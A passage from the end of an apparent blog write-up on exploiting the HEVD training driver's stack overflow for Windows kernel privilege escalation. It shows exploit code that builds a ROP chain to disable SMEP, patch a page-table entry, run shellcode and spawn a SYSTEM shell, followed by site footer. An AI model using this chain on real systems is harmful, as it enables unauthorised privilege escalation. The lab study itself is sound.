class="type">long</span> MiGetPteAddress=kernelbase+<span class="number">0x298780</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pte_addr=(<span class="number">0xFFFFF78000000000</span> &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7FFFFFFFF8</span>;</span><br><span class="line">    DWORD64* rop = (DWORD64*)((DWORD64)userBuffer + <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xb50ef8</span> ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">20</span>) ^ (<span class="number">1UL</span> &lt;&lt; <span class="number">21</span>);</span><br><span class="line">    *(rop + index++) = MOV_CR4_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RAX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = pte_addr+<span class="number">0x7</span>;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = MiGetPteAddress+<span class="number">0x13</span><span class="number">-0xa0</span>;</span><br><span class="line">    *(rop + index++) = add_rax_qword_ptr_rcx_0xa0_ret+kernelbase; <span class="comment">//add rax, [rcx+0xa];ret;</span></span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">    *(rop + index++) = mov_byte_ptr_rax_cl_ret+kernelbase;</span><br><span class="line">    *(rop + index++) = POP_RCX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line">    *(rop + index++) = POP_RDX_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = (DWORD64)shellcode;</span><br><span class="line">    *(rop + index++) = POP_R8_RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0x200</span>;</span><br><span class="line">    *(rop + index++) = memmove;</span><br><span class="line">    *(rop + index++) = RET+kernelbase;</span><br><span class="line">    *(rop + index++) = <span class="number">0xFFFFF78000000000</span>+<span class="number">0x720</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering Stack Overflow...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Buffer Size: %d\n&quot;</span>, <span class="number">0x900</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Overwriting RET with: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 发送 IOCTL 触发漏洞</span></span><br><span class="line">    success = DeviceIoControl(</span><br><span class="line">        hDevice,</span><br><span class="line">        HEVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">        userBuffer,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;bytesReturned,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] DeviceIoControl failed! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Payload sent!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 此时已经是 System 权限，再创建的子进程也是 System</span></span><br><span class="line">    CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    CloseHandle(hDevice);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-kernel"><span class="toc-number">1.</span> <span class="toc-text">windows kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HEVD%E2%80%93%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83-1"><span class="toc-number">1.1.</span> <span class="toc-text">HEVD–栈溢出漏洞实现提权-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#environment"><span class="toc-number">1.1.1.</span> <span class="toc-text">environment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%A1%88"><span class="toc-number">1.1.2.</span> <span class="toc-text">遇到的保护措施及绕过方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-KASLR-%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%B8%83%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1. KASLR (内核地址空间布局随机化)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SMEP-Supervisor-Mode-Execution-Prevention"><span class="toc-number">1.1.3.</span> <span class="toc-text">2. SMEP (Supervisor Mode Execution Prevention)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-KVAS-%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB-Kernel-Virtual-Address-Shadow"><span class="toc-number">1.1.4.</span> <span class="toc-text">3. KVAS (内核页表隔离 Kernel Virtual Address Shadow)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PTE-%E6%9D%83%E9%99%90%E4%BD%8D-MMPTE-HARDWARE-%E4%BB%A5%E5%8F%8A%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">PTE 权限位 (_MMPTE_HARDWARE)以及地址计算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5%EF%BC%9AToken-Stealing-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">1.1.5.</span> <span class="toc-text">4. 提权手段：Token Stealing (令牌窃取)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.</span> <span class="toc-text">5.相关结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EPROCESS-%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">_EPROCESS (进程结构体)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KTHREAD-%E7%BA%BF%E7%A8%8B%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">_KTHREAD (线程结构体)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KTRAP-FRAME-%E4%B8%AD%E6%96%AD%E5%B8%A7"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">_KTRAP_FRAME (中断帧)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-WinDbg"><span class="toc-number">1.1.7.</span> <span class="toc-text">6. 调试命令(WinDbg)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.8.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&text=[HEVD]learning_windows_kernel"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&is_video=false&description=[HEVD]learning_windows_kernel"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[HEVD]learning_windows_kernel&body=Check out this article: https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&title=[HEVD]learning_windows_kernel"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&name=[HEVD]learning_windows_kernel&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/&t=[HEVD]learning_windows_kernel"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Exploooosion
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
